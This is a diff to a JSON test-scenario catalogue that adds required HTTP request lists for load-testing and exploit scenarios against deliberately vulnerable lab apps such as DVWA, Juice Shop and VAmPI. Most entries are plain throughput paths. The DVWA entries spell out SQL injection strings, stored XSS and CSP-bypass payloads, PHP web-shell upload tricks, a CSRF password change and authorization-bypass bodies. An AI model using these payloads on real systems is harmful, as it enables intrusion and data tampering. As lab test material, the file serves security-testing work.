@@ -2345,7 +2345,51 @@
       "budget": "http",
       "parallel": true,
       "timeout_seconds": 900,
-      "adapter": "bounded-benchmark"
+      "adapter": "bounded-benchmark",
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "path-0",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "persistent-benchmark",
+            "minimum_dispatches": 25,
+            "headers": {
+              "connection": "keep-alive"
+            }
+          },
+          {
+            "id": "path-1",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "persistent-benchmark",
+            "minimum_dispatches": 25,
+            "headers": {
+              "connection": "keep-alive"
+            }
+          },
+          {
+            "id": "path-2",
+            "method": "GET",
+            "path": "/dvwa/",
+            "payload_class": "persistent-benchmark",
+            "minimum_dispatches": 25,
+            "headers": {
+              "connection": "keep-alive"
+            }
+          },
+          {
+            "id": "path-3",
+            "method": "GET",
+            "path": "/vampi/",
+            "payload_class": "persistent-benchmark",
+            "minimum_dispatches": 25,
+            "headers": {
+              "connection": "keep-alive"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "cdn-load-testing/bench-vm-compare",
@@ -2359,7 +2403,51 @@
       "budget": "http",
       "parallel": true,
       "timeout_seconds": 900,
-      "adapter": "bounded-benchmark"
+      "adapter": "bounded-benchmark",
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "path-0",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "new-connection-benchmark",
+            "minimum_dispatches": 25,
+            "headers": {
+              "connection": "close"
+            }
+          },
+          {
+            "id": "path-1",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "new-connection-benchmark",
+            "minimum_dispatches": 25,
+            "headers": {
+              "connection": "close"
+            }
+          },
+          {
+            "id": "path-2",
+            "method": "GET",
+            "path": "/dvwa/",
+            "payload_class": "new-connection-benchmark",
+            "minimum_dispatches": 25,
+            "headers": {
+              "connection": "close"
+            }
+          },
+          {
+            "id": "path-3",
+            "method": "GET",
+            "path": "/vampi/",
+            "payload_class": "new-connection-benchmark",
+            "minimum_dispatches": 25,
+            "headers": {
+              "connection": "close"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "challenge-verify/01-js-challenge-interstitial",
@@ -3587,7 +3675,26 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "password-change",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/csrf/",
+            "payload_class": "csrf-password-change",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "password_new": "password",
+              "password_conf": "password",
+              "Change": "Change"
+            },
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "dvwa-exploits/04-file-inclusion",
@@ -3722,7 +3829,55 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "file-0",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/upload/",
+            "payload_class": "multipart-php",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"dvwa-shell-[0-9]+\\.php\"[\\s\\S]*UPLOAD_SUCCESS",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "file-1",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/upload/",
+            "payload_class": "multipart-double-extension",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"dvwa-shell-[0-9]+\\.php\\.jpg\"[\\s\\S]*DOUBLE_EXT_SUCCESS",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "file-2",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/upload/",
+            "payload_class": "multipart-mime-spoof",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"dvwa-shell-mime-[0-9]+\\.php\"[\\s\\S]*MIME_SPOOF_SUCCESS",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "file-3",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/upload/",
+            "payload_class": "multipart-null-byte",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"dvwa-shell-null-[0-9]+\\.php%00\\.jpg\"[\\s\\S]*NULL_BYTE_SUCCESS",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "dvwa-exploits/06-sqli",
@@ -3836,7 +3991,78 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "boolean-0",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli_blind/",
+            "payload_class": "blind-sql-boolean",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "id": "1' AND 1=1-- -",
+              "Submit": "Submit"
+            },
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "boolean-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli_blind/",
+            "payload_class": "blind-sql-boolean",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "id": "1' AND 1=2-- -",
+              "Submit": "Submit"
+            },
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "length",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli_blind/",
+            "payload_class": "blind-sql-length-probe",
+            "minimum_dispatches": 1,
+            "query_regex": "id=.+SELECT.+LENGTH.+",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "sleep",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli_blind/",
+            "payload_class": "blind-sql-delay",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "id": "1' AND SLEEP(3)-- -",
+              "Submit": "Submit"
+            },
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "user",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli_blind/",
+            "payload_class": "blind-sql-identity",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "id": "1' AND (SELECT user FROM users WHERE user_id=1)='admin'-- -",
+              "Submit": "Submit"
+            },
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "dvwa-exploits/08-xss-dom",
@@ -4169,7 +4395,76 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "stored-0",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_regex": "txtName=TestXSS1\\&mtxMessage=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&btnSign=Sign\\+Guestbook&user_token=",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "stored-1",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_regex": "txtName=TestXSS2\\&mtxMessage=%3Cimg\\+src%3Dx\\+onerror%3Dalert%281%29%3E&btnSign=Sign\\+Guestbook&user_token=",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "stored-2",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_regex": "txtName=%3Cscript%3Ealert%28%27name%27%29%3C%2Fscript%3E\\&mtxMessage=Normal\\+message\\+with\\+XSS\\+name&btnSign=Sign\\+Guestbook&user_token=",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "stored-3",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_regex": "txtName=TestXSS4\\&mtxMessage=%3Csvg\\+onload%3Dalert%281%29%3E&btnSign=Sign\\+Guestbook&user_token=",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "stored-4",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_regex": "txtName=TestXSS5\\&mtxMessage=%3Ca\\+href%3Djavascript%3Aalert%281%29%3Eclickme%3C%2Fa%3E&btnSign=Sign\\+Guestbook&user_token=",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "persistence",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-readback",
+            "minimum_dispatches": 6,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "dvwa-exploits/11-csp-bypass",
@@ -4182,7 +4477,103 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "include-0",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/csp/",
+            "payload_class": "csp-script-inclusion",
+            "minimum_dispatches": 1,
+            "body_regex": "include=https%3A%2F%2Fpastebin\\.com%2Fraw%2FR570EE00&user_token=",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "include-1",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/csp/",
+            "payload_class": "csp-script-inclusion",
+            "minimum_dispatches": 1,
+            "body_regex": "include=https%3A%2F%2Fpastebin\\.com%2Fraw%2Ftest1234&user_token=",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "include-2",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/csp/",
+            "payload_class": "csp-script-inclusion",
+            "minimum_dispatches": 1,
+            "body_regex": "include=https%3A%2F%2Fcdnjs\\.cloudflare\\.com%2Fajax%2Flibs%2Fangular\\.js%2F1\\.4\\.6%2Fangular\\.js&user_token=",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "include-3",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/csp/",
+            "payload_class": "csp-script-inclusion",
+            "minimum_dispatches": 1,
+            "body_regex": "include=https%3A%2F%2Fcdn\\.jsdelivr\\.net%2Fnpm%2Ftest&user_token=",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "include-4",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/csp/",
+            "payload_class": "csp-script-inclusion",
+            "minimum_dispatches": 1,
+            "body_regex": "include=data%3Atext%2Fjavascript%2Calert%281%29&user_token=",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "include-5",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/csp/",
+            "payload_class": "csp-script-inclusion",
+            "minimum_dispatches": 1,
+            "body_regex": "include=blob%3Ahttp%3A%2F%2Flocalhost%2Ftest&user_token=",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "get-0",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/csp/",
+            "payload_class": "csp-get-inclusion",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "include": "https://pastebin.com/raw/R570EE00"
+            },
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "get-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/csp/",
+            "payload_class": "csp-get-inclusion",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "include": "data:text/javascript,alert(1)"
+            },
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "dvwa-exploits/12-weak-session",
@@ -4223,7 +4614,92 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "authenticated-read",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/authbypass/get_user_data.php",
+            "payload_class": "authenticated-data-read",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "unauth-read",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/authbypass/get_user_data.php",
+            "payload_class": "unauthenticated-data-read",
+            "minimum_dispatches": 2
+          },
+          {
+            "id": "change-admin",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/authbypass/change_user_details.php",
+            "payload_class": "authorization-bypass",
+            "minimum_dispatches": 2,
+            "body_exact": "{\"id\":1,\"first_name\":\"Hacked\",\"surname\":\"ByTest\"}",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "change-2",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/authbypass/change_user_details.php",
+            "payload_class": "horizontal-authorization-bypass",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"id\":2,\"first_name\":\"TestHack\",\"surname\":\"User2\"}",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "change-3",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/authbypass/change_user_details.php",
+            "payload_class": "horizontal-authorization-bypass",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"id\":3,\"first_name\":\"TestHack\",\"surname\":\"User3\"}",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "change-4",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/authbypass/change_user_details.php",
+            "payload_class": "horizontal-authorization-bypass",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"id\":4,\"first_name\":\"TestHack\",\"surname\":\"User4\"}",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "change-5",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/authbypass/change_user_details.php",
+            "payload_class": "horizontal-authorization-bypass",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"id\":5,\"first_name\":\"TestHack\",\"surname\":\"User5\"}",
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            }
+          },
+          {
+            "id": "no-auth-change",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/authbypass/change_user_details.php",
+            "payload_class": "unauthenticated-modification",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"id\":1,\"first_name\":\"NoAuth\",\"surname\":\"Test\"}",
+            "absent_headers": ["cookie"]
+          }
+        ]
+      }
     },
     {
       "id": "dvwa-exploits/14-open-redirect",
@@ -5423,7 +5899,91 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": true,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "endpoint-0",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-2",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-3",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100,
+            "query_values": {
+              "q": ""
+            }
+          },
+          {
+            "id": "endpoint-4",
+            "method": "GET",
+            "path": "/dvwa/login.php",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-5",
+            "method": "GET",
+            "path": "/vampi/users/v1",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-6",
+            "method": "GET",
+            "path": "/vampi/",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-7",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-8",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-9",
+            "method": "GET",
+            "path": "/csd-demo/",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-10",
+            "method": "GET",
+            "path": "/csd-demo/health",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          }
+        ]
+      }
     },
     {
       "id": "performance-testing/03-sustained-load",
@@ -5475,7 +6035,77 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": true,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "endpoint-0",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "per-endpoint-latency-sampling",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "endpoint-1",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "per-endpoint-latency-sampling",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "endpoint-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "per-endpoint-latency-sampling",
+            "minimum_dispatches": 20,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "endpoint-3",
+            "method": "GET",
+            "path": "/dvwa/login.php",
+            "payload_class": "per-endpoint-latency-sampling",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "endpoint-4",
+            "method": "GET",
+            "path": "/vampi/users/v1",
+            "payload_class": "per-endpoint-latency-sampling",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "endpoint-5",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "per-endpoint-latency-sampling",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "endpoint-6",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "per-endpoint-latency-sampling",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "endpoint-7",
+            "method": "GET",
+            "path": "/csd-demo/",
+            "payload_class": "per-endpoint-latency-sampling",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "endpoint-8",
+            "method": "GET",
+            "path": "/csd-demo/health",
+            "payload_class": "per-endpoint-latency-sampling",
+            "minimum_dispatches": 20
+          }
+        ]
+      }
     },
     {
       "id": "performance-testing/07-self-profile-under-load",
@@ -5527,7 +6157,53 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": true,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "endpoint-0",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "endpoint-1",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "endpoint-2",
+            "method": "GET",
+            "path": "/vampi/users/v1",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "endpoint-3",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "endpoint-4",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "endpoint-5",
+            "method": "GET",
+            "path": "/csd-demo/health",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 20
+          }
+        ]
+      }
     },
     {
       "id": "performance-testing/11-vegeta-constant-rate",
@@ -5540,7 +6216,70 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": true,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "vegeta-0",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "constant-rate-mixed-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "vegeta-1",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "constant-rate-mixed-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "vegeta-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "constant-rate-mixed-path",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "vegeta-3",
+            "method": "GET",
+            "path": "/vampi/users/v1",
+            "payload_class": "constant-rate-mixed-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "vegeta-4",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "constant-rate-mixed-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "vegeta-5",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "constant-rate-mixed-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "vegeta-6",
+            "method": "GET",
+            "path": "/csd-demo/health",
+            "payload_class": "constant-rate-mixed-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "vegeta-7",
+            "method": "GET",
+            "path": "/dvwa/login.php",
+            "payload_class": "constant-rate-mixed-path",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "performance-testing/12-hey-quick-bench",
@@ -5553,7 +6292,77 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": true,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "endpoint-0",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-1",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "endpoint-3",
+            "method": "GET",
+            "path": "/dvwa/login.php",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-4",
+            "method": "GET",
+            "path": "/vampi/users/v1",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-5",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-6",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-7",
+            "method": "GET",
+            "path": "/csd-demo/",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          },
+          {
+            "id": "endpoint-8",
+            "method": "GET",
+            "path": "/csd-demo/health",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 100
+          }
+        ]
+      }
     },
     {
       "id": "reconnaissance/01-nmap-service-scan",
